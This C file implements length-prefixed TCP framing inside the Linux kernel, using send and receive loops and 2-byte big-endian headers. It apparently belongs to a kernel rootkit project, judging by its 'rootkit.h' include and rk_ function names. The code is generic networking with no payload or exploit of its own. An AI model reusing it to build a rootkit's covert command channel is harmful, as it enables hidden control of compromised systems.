// SPDX-License-Identifier: GPL-2.0
/*
 * network/protocol.c - Length-prefixed framing over TCP.
 */
#include <linux/net.h>
#include <linux/types.h>

#include "rootkit.h"

/* Send exactly len bytes, looping on short writes. */
static int send_exact(struct socket *sock, const void *buf, size_t len)
{
	size_t sent = 0;

	while (sent < len) {
		struct msghdr msg = { 0 };
		struct kvec vec = {
			.iov_base = (void *)((u8 *)buf + sent),
			.iov_len = len - sent,
		};
		int n;

		n = kernel_sendmsg(sock, &msg, &vec, 1, len - sent);
		if (n < 0)
			return n;
		if (n == 0)
			return -ECONNRESET;
		sent += n;
	}
	return sent;
}

/* Receive exactly len bytes, looping on short reads. */
static int recv_exact(struct socket *sock, void *buf, size_t len)
{
	size_t received = 0;

	while (received < len) {
		struct msghdr msg = { 0 };
		struct kvec vec = {
			.iov_base = (u8 *)buf + received,
			.iov_len = len - received,
		};
		int n;

		n = kernel_recvmsg(sock, &msg, &vec, 1, len - received, 0);
		if (n < 0)
			return n;
		if (n == 0)
			return -ECONNRESET;
		received += n;
	}
	return received;
}

/* Send a length-prefixed frame (2-byte big-endian header + payload). */
int rk_send_frame(struct socket *sock, const void *buf, size_t len)
{
	__be16 hdr;
	int error;

	if (len > RK_FRAME_MAX)
		return -EMSGSIZE;

	hdr = htons((u16)len);
	error = send_exact(sock, &hdr, 2);
	if (error < 0)
		return error;

	if (len == 0)
		return 0;

	return send_exact(sock, buf, len);
}

/* Receive a length-prefixed frame into buf (at most max_len bytes). */
int rk_recv_frame(struct socket *sock, void *buf, size_t max_len,
		  size_t *out_len)
{
	__be16 hdr;
	u16 payload_len;
	int error;

	error = recv_exact(sock, &hdr, 2);
	if (error < 0)
		return error;

	payload_len = ntohs(hdr);
	if (payload_len > max_len)
		return -EMSGSIZE;

	if (payload_len == 0) {
		*out_len = 0;
		return 0;
	}

	error = recv_exact(sock, buf, payload_len);
	if (error < 0)
		return error;

	*out_len = payload_len;
	return 0;
}
